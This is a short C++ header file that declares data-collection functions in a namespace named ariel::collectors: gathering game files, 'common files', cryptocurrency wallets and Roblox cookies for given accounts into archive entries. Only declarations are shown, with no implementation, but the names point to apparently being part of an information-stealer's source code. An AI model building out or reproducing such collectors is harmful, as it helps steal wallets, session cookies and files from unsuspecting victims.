#pragma once

#include "archive.hpp"
#include "net.hpp"

#include <vector>

namespace ariel::collectors {

std::vector<archive::entry> games();
void games_into(std::vector<archive::entry>& out);
std::vector<archive::entry> common_files();
void common_files_into(std::vector<archive::entry>& out);
std::vector<archive::entry> wallets();
void wallets_into(std::vector<archive::entry>& out);
std::vector<archive::entry> roblox_cookies(
    const std::vector<net::roblox_account>& accounts);

}  // namespace ariel::collectors
